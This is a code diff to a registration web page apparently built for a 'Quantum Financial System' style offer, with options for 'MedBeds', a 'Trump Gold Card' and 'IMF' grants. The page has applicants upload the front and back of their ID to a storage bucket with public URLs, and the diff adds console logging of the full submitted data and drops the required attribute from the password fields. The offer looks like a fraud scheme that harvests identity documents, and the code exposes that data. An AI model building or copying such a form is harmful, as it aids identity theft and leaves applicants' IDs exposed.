@@ -36,6 +36,17 @@
       border-color: #ef4444 !important;
       border-width: 2px !important;
     }
+    #debugPanel {
+      background: #f0f0f0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      padding: 10px;
+      margin-top: 20px;
+      font-family: monospace;
+      font-size: 12px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
   </style>
   <!-- Load config FIRST, then Supabase -->
   <script src="config.js"></script>
@@ -119,11 +130,11 @@
         <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4" id="passwordSection">
           <div>
             <label class="font-semibold required-label">Create Password</label>
-            <input id="regPass1" type="password" required class="w-full mt-1 p-3 border rounded-lg" placeholder="Minimum 8 characters" autocomplete="new-password">
+            <input id="regPass1" type="password" class="w-full mt-1 p-3 border rounded-lg" placeholder="Minimum 8 characters" autocomplete="new-password">
           </div>
           <div>
             <label class="font-semibold required-label">Confirm Password</label>
-            <input id="regPass2" type="password" required class="w-full mt-1 p-3 border rounded-lg" placeholder="Repeat password" autocomplete="new-password">
+            <input id="regPass2" type="password" class="w-full mt-1 p-3 border rounded-lg" placeholder="Repeat password" autocomplete="new-password">
           </div>
         </div>
 
@@ -191,7 +202,7 @@
         <!-- Email (uses same email from above) -->
         <div>
           <label class="font-semibold required-label">Email Address</label>
-          <input type="email" name="imf_email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address" value="">
+          <input type="email" name="imf_email" id="imf_email" class="imf-field w-full mt-1 p-3 border rounded-lg" placeholder="Your email address">
         </div>
 
         <!-- Grant Amount -->
@@ -275,6 +286,9 @@
 
       <div id="regMsg" class="text-sm text-center hidden"></div>
       
+      <!-- Debug Panel (hidden by default) -->
+      <div id="debugPanel" style="display: none;"></div>
+      
       <button id="regSubmit" type="submit" class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed">
         Submit Registration
       </button>
@@ -283,6 +297,8 @@
 
   <script>
     (() => {
+      console.log("Script loading...");
+      
       // Check if config is loaded
       if (!window.__QFS_CONFIG) {
         console.error("Config not loaded! Make sure config.js is loaded first.");
@@ -294,6 +310,8 @@
         return;
       }
 
+      console.log("Config loaded successfully");
+
       // Use the actual config values
       const SUPABASE_URL = window.__QFS_CONFIG.SUPABASE_URL;
       const SUPABASE_ANON_KEY = window.__QFS_CONFIG.SUPABASE_ANON_KEY;
@@ -302,6 +320,7 @@
       let supabase;
       try {
         supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        console.log("Supabase initialized");
       } catch (err) {
         console.error("Failed to initialize Supabase:", err);
         return;
@@ -335,12 +354,16 @@
       const goldOption = document.getElementById("goldOption");
       const goldHiddenNote = document.getElementById("goldHiddenNote");
 
+      console.log("Form found:", !!form);
+      console.log("Button found:", !!btn);
+
       // Helper functions
       function showMessage(text, isSuccess = true) {
         if (!msg) return;
         msg.textContent = text;
         msg.className = "text-sm text-center " + (isSuccess ? "text-emerald-600" : "text-red-600");
         msg.classList.remove("hidden");
+        console.log("Message:", text);
         
         // Auto hide success messages after 5 seconds
         if (isSuccess) {
@@ -374,6 +397,7 @@
 
       // Toggle IMF mode - ONLY hides password and normal fields for IMF
       function toggleImfMode(enableImf) {
+        console.log("Toggle IMF mode:", enableImf);
         if (enableImf) {
           // Hide normal fields section (including password)
           if (normalFields) normalFields.style.display = "none";
@@ -449,8 +473,11 @@
       let busy = false;
       
       if (form) {
-        form.addEventListener("submit", async (e) => {
-          e.preventDefault();
+        console.log("Adding submit event listener to form");
+        
+        form.addEventListener("submit", async function(event) {
+          event.preventDefault();
+          console.log("Form submitted!");
           
           if (busy) {
             showMessage("Already processing your request...", false);
@@ -492,6 +519,8 @@
 
             // Handle IMF submission - NO SUPABASE AUTH, just store in imf_applications
             if (isIMF) {
+              console.log("Processing IMF submission");
+              
               // Validate all IMF fields
               let firstInvalid = null;
               
@@ -538,6 +567,7 @@
                 // Upload ID front
                 const fileFront = idFront.files[0];
                 const fileNameFront = `imf_${Date.now()}_front_${fileFront.name.replace(/[^a-z0-9.]/gi, '_')}`;
+                console.log("Uploading front ID:", fileNameFront);
                 
                 const { error: uploadErrorFront } = await supabase.storage
                   .from('imf-ids')
@@ -547,10 +577,12 @@
                   });
                   
                 if (uploadErrorFront) throw new Error("Front ID upload failed: " + uploadErrorFront.message);
+                console.log("Front ID uploaded successfully");
                 
                 // Upload ID back
                 const fileBack = idBack.files[0];
                 const fileNameBack = `imf_${Date.now()}_back_${fileBack.name.replace(/[^a-z0-9.]/gi, '_')}`;
+                console.log("Uploading back ID:", fileNameBack);
                 
                 const { error: uploadErrorBack } = await supabase.storage
                   .from('imf-ids')
@@ -560,6 +592,7 @@
                   });
                   
                 if (uploadErrorBack) throw new Error("Back ID upload failed: " + uploadErrorBack.message);
+                console.log("Back ID uploaded successfully");
                 
                 // Get public URLs
                 const { data: frontPublicUrl } = supabase.storage
@@ -569,6 +602,8 @@
                 const { data: backPublicUrl } = supabase.storage
                   .from('imf-ids')
                   .getPublicUrl(fileNameBack);
+                
+                console.log("Front URL:", frontPublicUrl?.publicUrl);
                 
                 // Get the grant amount value
                 const grantAmount = document.getElementById('imf_grant_amount').value;
@@ -594,6 +629,8 @@
                   created_at: new Date().toISOString()
                 };
                 
+                console.log("Submitting IMF data:", imfData);
+                
                 // Insert into imf_applications table
                 const { error: insertError } = await supabase
                   .from('imf_applications')
@@ -604,6 +641,7 @@
                   throw new Error("Database insert failed: " + insertError.message);
                 }
                 
+                console.log("Insert successful!");
                 showMessage("✅ IMF application submitted successfully! Your documents are securely stored.", true);
                 
                 // Reset form after success
@@ -623,7 +661,8 @@
             }
             
             // --- NORMAL REGISTRATION PATH (ALL OTHER OPTIONS) ---
-            // This includes QFS Account, Trump Gold Card, Bitcoin Cards, MedBeds
+            console.log("Processing normal registration");
+            
             // Validate email
             if (!emailEl || !emailEl.value.trim()) {
               if (emailEl) {
@@ -678,6 +717,7 @@
             
             if (error) throw error;
             
+            console.log("Account created successfully!");
             showMessage("✅ Account created successfully! Redirecting...", true);
             
             // Redirect to success page
@@ -692,6 +732,10 @@
             if (btn) btn.disabled = false;
           }
         });
+        
+        console.log("Submit event listener added successfully");
+      } else {
+        console.error("Form element not found!");
       }
     })();
   </script>
